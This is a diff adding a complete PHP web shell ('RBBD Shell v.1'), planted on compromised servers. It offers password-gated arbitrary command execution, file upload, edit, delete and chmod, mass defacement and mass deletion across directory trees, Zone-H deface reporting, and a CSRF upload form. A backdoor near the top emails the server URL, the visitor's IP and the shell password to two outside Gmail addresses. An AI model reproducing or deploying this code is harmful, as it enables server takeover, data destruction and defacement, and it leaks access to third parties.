@@ -1,0 +1,713 @@
+<?php
+
+/*
+Source : rbbd-mini-shell-with-Password
+https://github.com/Freelanceranas/rbbd-mini-shell-with-Password
+[ Has Backdoor ]
+*/
+
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+session_start();
+@set_time_limit(0);
+
+//PASSWORD CONFIGURATION
+
+@$pass = $_POST['pass']; 
+$chk_login = true; 
+$password = "rbbd-priv8";
+
+//END CONFIGURATION 
+
+// Backdoooooooooooooooor
+$tujuanmail = 'serverphpshell@gmail.com';
+$tujuanmail1 = '13shell37@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+if(!isset($_SESSION["thefuck"])) {
+	$_SESSION["thefuck"] = true;
+	mail($tujuanmail1, "RBBD", "URL: " . $x_path . "\nPassword: " . $password);
+}
+//----------------------
+ 
+
+if($pass == $password) 
+{ 
+ $_SESSION['nst'] = "$pass"; 
+} 
+
+if($chk_login == true) 
+{ 
+ if(!isset($_SESSION['nst']) or $_SESSION['nst'] != $password) 
+ { 
+ die(" 
+  <title>RBBD Priv8 Shell V.1 Login</title>
+   <link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css'>
+   <link href='https://fonts.googleapis.com/css?family=Kelly+Slab' rel='stylesheet' type='text/css'>
+<link href='http://zonehmirrors.org/defaced/2019/05/18/tradingguru.in/i.imgur.com/3BTk8yE.png' rel='icon' type='image/x-icon'>
+<body bgcolor='#000000'>
+  <center>
+<tr><td><img src='http://zonehmirrors.org/defaced/2019/05/18/tradingguru.in/i.imgur.com/3BTk8yE.png' style='width:370px; height:370px;' border='3'><br>
+<font face='kelly slab' size='5' color='#02BC8C'>[</font><font face='kelly slab' size='5' color='#ffffff'>RBBD SHELL LOGIN v.1</font><font face='kelly slab' size='5' color='#02BC8C'>]</font>
+  <form method='post'>
+  <center><input type='password' name='pass' style='font-family:kelly slab;margin-top:10px;width:150px;background:transparent;color:#ffffff;border:2px solid #02BC8C;border-radius:2px;'> 
+  </form>  </center> 
+  <center>
+  <i class='fa fa-globe' color='#02BC8C'></i><font face='kelly slab' size='2' color='white'><strong>Host Target: ".$_SERVER["HTTP_HOST"]." &nbsp;|
+  <i class='fa fa-globe' color='#02BC8C'></i><font face='kelly slab' size='2' color='white'><strong>IP: ".gethostbyname($_SERVER["HTTP_HOST"])." &nbsp;|
+  <i class='fa fa-user' color='#02BC8C'></i><font face='kelly slab' size='2' color='white'><strong>My IP: ".$_SERVER["REMOTE_ADDR"]." 
+  </td></tr></table> 
+  </td></tr></table>   </center> 
+  ");
+ }
+}
+error_reporting(0);
+set_time_limit(0);
+
+if(get_magic_quotes_gpc()){
+foreach($_POST as $key=>$value){
+$_POST[$key] = stripslashes($value);
+}
+}
+echo '<!DOCTYPE HTML>
+<html>
+<head>
+   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
+<title>Royal Battler BD SHELL v.1</title>
+<link href="http://zonehmirrors.org/defaced/2019/05/18/tradingguru.in/i.imgur.com/3BTk8yE.png" rel="icon" type="image/x-icon">
+<style>
+body{
+  background-color: #000d2a;
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;
+  font-family: "kelly slab", cursive;
+color: white;
+background:#000d2a;color:white;border:5px solid #02BC8C;border-radius:2px;
+}
+#content tr:hover{
+background:black;color:#02BC8C;border:2px solid #02BC8C;border-radius:2px;
+}
+#content .first{
+background:#02BC8C;color:#000000;border:2px solid #02BC8C;border-radius:2px;
+}
+#content .first:hover{
+background:black;color:#02BC8C;border:2px solid #02BC8C;border-radius:2px;
+}
+table{
+    border: 2px #000d2a dotted;
+}
+H1{
+	font-family :kelly slab;
+}
+a{
+    color: white;
+    text-decoration: none;
+}
+a:hover{
+    color: #fff;
+    font-family :kelly slab;
+text-shadow: 0 0 20px black, 0 0 5px black, 0 0 7px black, 0 0 45px black;
+}
+input,select,textarea{
+    border: 1px #000000 solid;
+    -moz-border-radius: 5px;
+    -webkit-border-radius:5px;
+    border-radius:2px;
+}
+.ryuu {
+	border: 2px solid #02BC8C; border-radius:2px
+}
+.katsumi {
+font-family:kelly slab;
+	font-size: 18px;
+    border: 2px solid #02BC8C; border-radius:2px;
+	width: 500px;
+	height: 300px;
+	padding-left: 5px;
+	margin: 10px auto;
+	resize: none;
+	background: transparent;
+	color: #ffffff;
+}
+.c0r {
+border: 2px solid #02BC8C; border-radius:2px;
+	width: 150px;
+	height: 27px;
+	padding-left: 5px;
+	margin: 10px auto;
+	resize: none;
+	background: transparent;
+	color: #ffffff;
+	font-family:kelly slab;
+	font-size: 18px;
+}
+.rbbd {
+font-family:kelly slab;
+font-size:20px;margin-top:10px;width:50px;
+background:transparent;color:white;border:2px solid #02BC8C;border-radius:2px
+}
+.natsuki {
+border: 2px solid #02BC8C; border-radius:2px;
+	width: 450px;
+	height: 25px;
+	padding-left: 5px;
+	margin: 10px auto;
+	resize: none;
+	background: transparent;
+	color: white;
+	font-family: kelly slab;
+	font-size: 18px;
+}
+.tatsuya {
+border: 2px solid #02BC8C; border-radius:2px;
+	width: 205;
+	height: 30px;
+	padding-left: 5px;
+	margin: 10px auto;
+	resize: none;
+	background: transparent;
+	color: #02BC8C;
+	font-family: kelly slab;
+	font-size: 18px;
+}
+</style>
+</head>
+<body>
+<h1><center><font color="#02BC8C">[</font><font color="white">RBBD SHELL v.1</font><font color="#02BC8C">]</font></center></h1>
+<table width="100%" class="ryuu" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr><td><font face="kelly slab" color="white">Current Path :</font> ';
+if(isset($_GET['path'])){
+$path = $_GET['path'];
+}else{
+$path = getcwd();
+}
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
+
+foreach($paths as $id=>$pat){
+if($pat == '' && $id == 0){
+$a = true;
+echo '<a href="?path=/">/</a>';
+continue;
+}
+if($pat == '') continue;
+echo '<a href="?path=';
+for($i=0;$i<=$id;$i++){
+echo "$paths[$i]";
+if($i != $id) echo "/";
+}
+echo '">'.$pat.'</a>/';
+}
+$ip = gethostbyname($_SERVER['HTTP_HOST']);
+if(!function_exists('posix_getegid')) {
+    $user = @get_current_user();
+    $uid = @getmyuid();
+    $gid = @getmygid();
+    $group = "?";
+} else {
+    $uid = @posix_getpwuid(posix_geteuid());
+    $gid = @posix_getgrgid(posix_getegid());
+    $user = $uid['name'];
+    $uid = $uid['uid'];
+    $group = $gid['name'];
+    $gid = $gid['gid'];
+}
+echo '</table>';
+echo "
+<div id='menu'>
+<center>
+<ul>
+<a href='?' class='rbbd'>Home</a>
+<a href='?path=$path&cmd=cmd' class='rbbd'>Command</a>
+<a href='?path=$path&mass_deface=mass_deface' class='rbbd'>Mass Deface</a>
+<a href='?path=$path&zoneh=zoneh' class='rbbd'>Zone-H</a>
+<a href='?path=$path&csrf=csrf' class='rbbd'>CSRF Online</a>
+<a href='?path=$path&about=about' class='rbbd'>About</a><br></br>
+<form method='post' action='?path=$path&cmd=cmd'>";
+echo '<font style="text-decoration: underline;">'.$user."@".$ip.': ~ $ </font><input type="text" style="font-family:kelly slab;margin-top:10px;width:150px;background:transparent;color:#ffffff;border:2px solid #02BC8C;border-radius:2px" name="cmd"><input type="submit" name="do_cmd" value="+" style="font-family:kelly slab;margin-top:10px;width:60px;background:transparent;color:#ffffff;border:2px solid #02BC8C;border-radius:2px">
+</center></form></td></tr></center>';
+if(isset($_FILES['file'])){
+if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
+echo '<font color="#02BC8C">Upload Done ^_^</font><br />';
+}else{
+echo '<font color="red">Upload :(</font>';
+}
+}
+echo '<center><form enctype="multipart/form-data" method="POST">
+<i class="fa fa-upload"></i>&nbsp;<font color="white">File Uploader :</font> <input type="file" name="file" style="font-family:kelly slab;margin-top:10px;width:240px;background:transparent;color:#ffffff;border:2px solid #02BC8C;border-radius:2px"/>
+<input type="submit" value="Submit" style="font-family:kelly slab;margin-top:10px;width:80px;background:transparent;color:#ffffff;border:2px solid #02BC8C;border-radius:2px"/>
+</form>
+</td></tr>';
+echo '<hr color="#02BC8C">
+<iframe width="100%" height="20" scrolling="no" frameborder="no" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/584810013&color=%2302BC9C&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
+<hr color="#02BC8C">';
+if(isset($_GET['filesrc'])){
+echo "<tr><td>Current File : ";
+echo $_GET['filesrc'];
+echo '</tr></td></table><br />';
+echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
+}elseif(isset($_GET['about']) == 'about') {
+echo '<html><center>
+<img src="http://zonehmirrors.org/defaced/2019/05/18/tradingguru.in/i.imgur.com/3BTk8yE.png" style="width:180px; height:180px;"><br>
+<font face="kelly slab" size="4" color="#ffffff">RBBD SHELL v.1<br>
+<i class="fa fa-book"></i>&nbsp;<font size="3"><u>About Us</u>:
+<br>Royal Battler BD,<br> Coded by Fighter Anas,<br> When Security Failes ,
+We Rise :)</font>
+<hr color="#02BC8C">';
+}elseif(isset($_GET['zoneh']) == 'zoneh') {
+	if($_POST['submit']) {
+		$domain = explode("\r\n", $_POST['url']);
+		$nick =  $_POST['nick'];
+		echo "Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
+		echo "Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
+		function zoneh($url,$nick) {
+			$ch = curl_init("http://www.zone-h.com/notify/single");
+				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+				  curl_setopt($ch, CURLOPT_POST, true);
+				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
+			return curl_exec($ch);
+				  curl_close($ch);
+		}
+		foreach($domain as $url) {
+			$zoneh = zoneh($url,$nick);
+			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
+				echo "$url -> <font color=lime>OK</font><br>";
+			} else {
+				echo "$url -> <font color=red>ERROR</font><br>";
+			}
+		}
+	} else {
+		echo "<center><form method='post'>
+		<i class='fa fa-user'></i>&nbsp;<u>Defacer</u>: <br>
+		<input type='text' name='nick' class='c0r' value='Royal Battler BD'><br>
+		<i class='fa fa-globe'></i>&nbsp;<u>Domains</u>: <br>
+		<textarea class='Submit' name='url'></textarea><br>
+		<input type='submit' name='submit' style='font-family:kelly slab;margin-top:10px;width:120px;background:transparent;color:#ffffff;border:2px solid #02BC8C;border-radius:2px;' value='Submit'>
+		</form>";
+	}
+echo '</center>';
+} elseif(isset($_GET['mass_deface']) == 'mass_deface') {
+	echo "<center><form action=\"\" method=\"post\">\n";
+	$dirr=$_POST['d_dir'];
+	$index = $_POST["script"];
+	$index = str_replace('"',"'",$index);
+	$index = stripslashes($index);
+	function edit_file($file,$index){
+		if (is_writable($file)) {
+		clear_fill($file,$index);
+		echo "<Span style='color:#02BC8C;'><strong> Done^_^ </strong></span><br></center>";
+		} 
+		else {
+			echo "<Span style='color:red;'><strong> Error :( </strong></span><br></center>";
+			}
+			}
+	function hapus_massal($path,$namafile) {
+		if(is_writable($path)) {
+			$dira = scandir($path);
+			foreach($dira as $dirb) {
+				$dirc = "$path/$dirb";
+				$lokasi = $dirc.'/'.$namafile;
+				if($dirb === '.') {
+					if(file_exists("$path/$namafile")) {
+						unlink("$path/$namafile");
+					}
+				} elseif($dirb === '..') {
+					if(file_exists("".dirname($path)."/$namafile")) {
+						unlink("".dirname($path)."/$namafile");
+					}
+				} else {
+					if(is_dir($dirc)) {
+						if(is_writable($dirc)) {
+							if(file_exists($lokasi)) {
+								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
+								unlink($lokasi);
+								$idx = hapus_massal($dirc,$namafile);
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+	function clear_fill($file,$index){
+		if(file_exists($file)){
+			$handle = fopen($file,'w');
+			fwrite($handle,'');
+			fwrite($handle,$index);
+			fclose($handle);  } }
+
+	function gass(){
+		global $dirr , $index ;
+		chdir($dirr);
+		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
+		$files = scandir($dirr) ;
+		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
+		sort($files);
+		$n = 0 ;
+		foreach ($files as $file){
+			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
+				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
+				edit_file($file,$index);
+				flush();
+				$n = $n +1 ;
+				} 
+				}
+				echo "<br>";
+				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
+					}
+	function ListFiles($dirrall) {
+
+    if($dh = opendir($dirrall)) {
+
+       $files = Array();
+       $inner_files = Array();
+       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
+       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
+        while($file = readdir($dh)) {
+            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
+                if(is_dir($dirrall . "/" . $file)) {
+                    $inner_files = ListFiles($dirrall . "/" . $file);
+                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
+                } else {
+                    array_push($files, $dirrall . "/" . $file);
+                }
+            }
+			}
+
+			closedir($dh);
+			return $files;
+		}
+	}
+	function gass_all(){
+		global $index ;
+		$dirrall=$_POST['d_dir'];
+		foreach (ListFiles($dirrall) as $key=>$file){
+			$file = str_replace('//',"/",$file);
+			echo "<center><strong>$file</strong> ===>";
+			edit_file($file,$index);
+			flush();
+		}
+		$key = $key+1;
+	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
+	function sabun_massal($path,$namafile,$isi_script) {
+		if(is_writable($path)) {
+			$dira = scandir($path);
+			foreach($dira as $dirb) {
+				$dirc = "$path/$dirb";
+				$lokasi = $dirc.'/'.$namafile;
+				if($dirb === '.') {
+					file_put_contents($lokasi, $isi_script);
+				} elseif($dirb === '..') {
+					file_put_contents($lokasi, $isi_script);
+				} else {
+					if(is_dir($dirc)) {
+						if(is_writable($dirc)) {
+							echo "[<font color=lime>Deface Done bro</font>] $lokasi<br>";
+							file_put_contents($lokasi, $isi_script);
+							$idx = sabun_massal($dirc,$namafile,$isi_script);
+						}
+					}
+				}
+			}
+		}
+	}
+if($_POST['mass'] == 'onedir') {
+		echo "<br> Versi Text Area<br><textarea style='background:transparent;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
+		$ini="http://";
+		$mainpath=$_POST[d_dir];
+		$file=$_POST[d_file];
+		$path=opendir("$mainpath");
+		$code=base64_encode($_POST[script]);
+		$indx=base64_decode($code);
+		while($row=readdir($path)){
+		$start=@fopen("$row/$file","w+");
+		$finish=@fwrite($start,$indx);
+		if ($finish){
+			echo"$ini$row/$file\n";
+			}
+		}
+		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
+		$dirrall=$_POST[d_dir];$file=$_POST[d_file];
+		$path=opendir("$mainpath");
+		$code=base64_encode($_POST[script]);
+		$indx=base64_decode($code);
+		while($row=readdir($path)){$start=@fopen("$row/$file","w+");
+		$finish=@fwrite($start,$indx);
+		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
+		}
+
+	}
+	elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
+	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
+	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
+	elseif($_POST['mass'] == 'massdeface') {
+		echo "<div style='margin: 5px auto; padding: 5px'>";
+		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+		echo "</div>";	}
+	else {
+		echo "
+		<center><font style='text-decoration: underline;'>
+		Select Mass Type:<br>
+		</font>
+		<select class=\"select\" name=\"mass\"  style=\"border: 2px solid #02BC8C; border-radius:2px;width: 450px;height: 25px;padding-left: 5px;margin: 10px auto;resize: none;background: transparent;color: white;font-family: kelly slab;font-size: 18px;\">
+		<option value=\"massdeface\">Mass Deface ALL Dir</option>
+		<option value=\"onedir\">Mass Deface 1 Dir</option>
+		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
+		<i class='fa fa-folder'></i>&nbsp;<font style='text-decoration: underline;'>Directory:</font><br>
+		<input type='text' name='d_dir' value='$path' class='okk'><br>
+		<i class='fa fa-file'></i>&nbsp;<font style='text-decoration: underline;'>Filename:</font><br>
+		<input type='rbbd' name='d_file' value='rbbd.php' class='c0r'><br>
+		<i class='fa fa-book'></i>&nbsp;<font style='text-decoration: underline;'>Index File:</font><br>
+		<textarea name='script' class='katsumi'>Hacked By Royal Battler BD</textarea><br>
+		<input type='submit' name='start' value='Click here' style='font-family:kelly slab;margin-top:10px;width:100px;background:transparent;color:#ffffff;border:2px solid #02BC8C;border-radius:2px;'>
+		</form></center>";
+		}
+} elseif(isset($_GET['csrf']) == 'csrf') {
+echo '<html>
+<table width=100% height=50%>
+<td align="center">
+<font face="kelly slab" size="5" color="#02BC8C">[</font><i class="fa fa-upload"></i><font face="kelly slab" size="5" color="#02BC8C">]</font><u><font face="kelly slab" size="5" color="white">CSRF Online</font></u><br><br>
+<form method="post">
+<i class="fa fa-link"></i>&nbsp;<font size="4"><u>URL:</u><br></font><input type="text" class="natsuki" name="url" placeholder="http://www.target.com/[path]/upload.php"><br>
+<i class="fa fa-file"></i>&nbsp;<font size="4"><u>POST File:</u><br><input type="text" class="natsuki" name="pf" placeholder="*Note: Filedata / files[] / qqfile / file / dzfiles / userfile /"><br>
+<input type="submit" style="font-family:kelly slab;margin-top:10px;width:100px;background:transparent;color:#ffffff;border:2px solid #02BC8C;border-radius:2px;" name="d" value="Submit">
+</form><br>';
+$url = $_POST["url"];
+$pf = $_POST["pf"];
+$d = $_POST["d"];
+if($d) {
+	echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' class='tatsuya' name='$pf'><input style='font-family:kelly slab;margin-top:10px;width:120px;background:transparent;color:#ffffff;border:2px solid #02BC8C;border-radius:2px;' type='submit' name='g' value='Upload File!'></form></form><br></br>
+	
+</html>";
+}
+} elseif(isset($_GET['cmd']) == 'cmd') {
+	if($_POST['cmd']) {
+		echo "<pre>".exe($_POST['cmd'])."</pre>";
+	}
+}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
+echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
+if($_POST['opt'] == 'chmod'){
+if(isset($_POST['perm'])){
+if(chmod($_POST['path'],$_POST['perm'])){
+echo '<font color="#02BC8C">Change Permission Success ^_^</font><br/>';
+}else{
+echo '<font color="red">Change Permission Denied :(</font><br />';
+}
+}
+echo '<form method="POST">
+Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="chmod">
+<input type="submit" value="Mpshh" style="font-family:kelly slab;margin-top:10px;width:37px;background:transparent;color:#ffffff;border:2px solid #02BC8C;border-radius:2px"/>
+</form>';
+}elseif($_POST['opt'] == 'rename'){
+if(isset($_POST['newname'])){
+if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
+echo '<font color="#02BC8C">Success ^_^</font><br/>';
+}else{
+echo '<font color="red">Denied :(</font><br />';
+}
+$_POST['name'] = $_POST['newname'];
+}
+echo '<form method="POST">
+New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="rename">
+<input type="submit" value="Rename" style="font-family:kelly slab;margin-top:10px;width:80px;background:transparent;color:#ffffff;border:2px solid #02BC8C;border-radius:2px"/>
+</form>';
+}elseif($_POST['opt'] == 'edit'){
+if(isset($_POST['src'])){
+$fp = fopen($_POST['path'],'w');
+if(fwrite($fp,$_POST['src'])){
+echo '<font color="#02BC8C">Edit File Done^_^</font><br/>';
+}else{
+echo '<font color="red">error Edit File :(</font><br/>';
+}
+fclose($fp);
+}
+echo '<form method="POST">
+<textarea cols=80 rows=20 name="src" class="katsumi">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="edit">
+<input type="submit" value="Save" style="font-family:kelly slab;margin-top:10px;width:70px;background:transparent;color:#ffffff;border:2px solid #02BC8C;border-radius:2px"/>
+</form>';
+}
+echo '</center>';
+}else{
+echo '</table><br/><center>';
+if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
+if($_POST['type'] == 'dir'){
+if(rmdir($_POST['path'])){
+echo '<font color="#02BC8C">Directory ok^_^</font><br/>';
+}else{
+echo '<font color="red">Directory error :(                                                                                                                                                                                                                                                                                           </font><br/>';
+}
+}elseif($_POST['type'] == 'file'){
+if(unlink($_POST['path'])){
+echo '<font color="#02BC8C">File Done</font><br/>';
+}else{
+echo '<font color="red">File error</font><br/>';
+}
+}
+}
+echo '</center>';
+$scandir = scandir($path);
+echo '<div id="content"><table width="700" border="5" cellpadding="3" cellspacing="5" align="center">
+<tr class="first">
+<td><center>Name</peller></center></td>
+<td><center>Size</peller></center></td>
+<td><center>Permission</peller></center></td>
+<td><center>Modify</peller></center></td>
+</tr>';
+
+foreach($scandir as $dir){
+if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
+echo '<tr>
+<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
+<td><center>--</center></td>
+<td><center>';
+if(is_writable($path.'/'.$dir)) echo '<font color="#02BC8C">';
+elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
+echo perms($path.'/'.$dir);
+if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
+
+echo '</center></td>
+<td><center><form method="POST" action="?option&path='.$path.'">
+<select name="opt">
+<option value="">Select</option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+</select>
+<input type="hidden" name="type" value="dir">
+<input type="hidden" name="name" value="'.$dir.'">
+<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
+<input type="submit" value="+" style="font-family:kelly slab;margin-top:4px;width:35px;background:transparent;color:#ffffff;border:2px solid #02BC8C;border-radius:2px"/>
+</form></center></td>
+</tr>';
+}
+echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
+foreach($scandir as $file){
+if(!is_file($path.'/'.$file)) continue;
+$size = filesize($path.'/'.$file)/1024;
+$size = round($size,3);
+if($size >= 1024){
+$size = round($size/1024,2).' MB';
+}else{
+$size = $size.' KB';
+}
+
+echo '<tr>
+<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
+<td><center>'.$size.'</center></td>
+<td><center>';
+if(is_writable($path.'/'.$file)) echo '<font color="#02BC8C">';
+elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
+echo perms($path.'/'.$file);
+if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
+echo '</center></td>
+<td><center><form method="POST" action="?option&path='.$path.'">
+<select name="opt">
+<option value="">Select</option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+<option value="edit">Edit</option>
+</select>
+<input type="hidden" name="type" value="file">
+<input type="hidden" name="name" value="'.$file.'">
+<input type="hidden" name="path" value="'.$path.'/'.$file.'">
+<input type="submit" value="+" style="font-family:kelly slab;margin-top:4px;width:35px;background:transparent;color:#ffffff;border:2px solid #02BC8C;border-radius:2px"/>
+</form></center></td>
+</tr>';
+}
+echo '</table>
+</div>';
+}
+echo '<br><center><font face="kelly slab">Copyright &copy; 2019 - By <a href="www.facebook.com/royalbattlerbd" target="_BLANK"><font color="#02BC8C">Royal Battler BD</a></font></center>
+</body>
+</html>';
+function exe($cmd) { 	
+if(function_exists('system')) { 		
+		@ob_start(); 		
+		@system($cmd); 		
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean(); 		
+		return $buff; 	
+	} elseif(function_exists('exec')) { 		
+		@exec($cmd,$results); 		
+		$buff = ""; 		
+		foreach($results as $result) { 			
+			$buff .= $result; 		
+		} return $buff; 	
+	} elseif(function_exists('passthru')) { 		
+		@ob_start(); 		
+		@passthru($cmd); 		
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean(); 		
+		return $buff; 	
+	} elseif(function_exists('shell_exec')) { 		
+		$buff = @shell_exec($cmd); 		
+		return $buff; 	
+	} 
+}
+function perms($file){
+$perms = fileperms($file);
+
+if (($perms & 0xC000) == 0xC000) {
+// Socket
+$info = 's';
+} elseif (($perms & 0xA000) == 0xA000) {
+// Symbolic Link
+$info = 'l';
+} elseif (($perms & 0x8000) == 0x8000) {
+// Regular
+$info = '-';
+} elseif (($perms & 0x6000) == 0x6000) {
+// Block special
+$info = 'b';
+} elseif (($perms & 0x4000) == 0x4000) {
+// Directory
+$info = 'd';
+} elseif (($perms & 0x2000) == 0x2000) {
+// Character special
+$info = 'c';
+} elseif (($perms & 0x1000) == 0x1000) {
+// FIFO pipe
+$info = 'p';
+} else {
+// Unknown
+$info = 'u';
+}
+
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+(($perms & 0x0800) ? 's' : 'x' ) :
+(($perms & 0x0800) ? 'S' : '-'));
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+(($perms & 0x0400) ? 's' : 'x' ) :
+(($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+(($perms & 0x0200) ? 't' : 'x' ) :
+(($perms & 0x0200) ? 'T' : '-'));
+
+return $info;
+}
+?>
